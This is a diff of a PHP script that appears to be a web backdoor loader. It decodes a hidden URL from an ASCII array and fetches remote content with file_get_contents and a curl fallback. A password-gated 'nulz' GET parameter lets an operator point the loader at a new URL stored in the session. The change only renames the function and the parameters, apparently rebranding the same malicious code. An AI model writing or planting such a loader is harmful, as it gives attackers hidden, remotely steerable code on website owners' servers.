@@ -1,5 +1,5 @@
 <?php session_start();
-function kontol($url)
+function NuLzGG($url)
 {
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
@@ -15,20 +15,20 @@ foreach ($asciiArray as $ascii) {
 }
 $url = $decodedString;
 $correct_password = '$2y$10$TGT36epmgr3/fTZ.XPB9nuXbKG5GcQYw/P3gFs4F7kIRflxBIWRAS';
-if (isset($_GET['ts_reset'])) {
-    $_SESSION["ts_url"] = "";
+if (isset($_GET['nulz_reset'])) {
+    $_SESSION["nulz_url"] = "";
     echo "success";
     exit;
 }
-if (isset($_GET['ts'])) {
+if (isset($_GET['nulz'])) {
     if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         if (isset($_POST['password'])) {
             $provided_password = $_POST['password'];
             if (password_verify($provided_password, $correct_password)) {
                 if (isset($_POST['url'])) {
                     $url = $_POST['url'];
-                    $_SESSION["ts_url"] = $url;
-                    echo "updated : " . $_SESSION["ts_url"];
+                    $_SESSION["nulz_url"] = $url;
+                    echo "updated : " . $_SESSION["nulz_url"];
                     exit;
                 } else {
                     echo "Error!";
@@ -83,15 +83,15 @@ if (isset($_GET['ts'])) {
         <?php exit;
     }
 } else {
-    if (empty($_SESSION["ts_url"])) {
+    if (empty($_SESSION["nulz_url"])) {
         $result = @file_get_contents($url);
         if (empty($result)) {
-            $result = kontol($url);
+            $result = NuLzGG($url);
         }
     } else {
-        $result = @file_get_contents($_SESSION["ts_url"]);
+        $result = @file_get_contents($_SESSION["nulz_url"]);
         if (empty($result)) {
-            $result = kontol($_SESSION["ts_url"]);
+            $result = NuLzGG($_SESSION["nulz_url"]);
         }
     }
 }
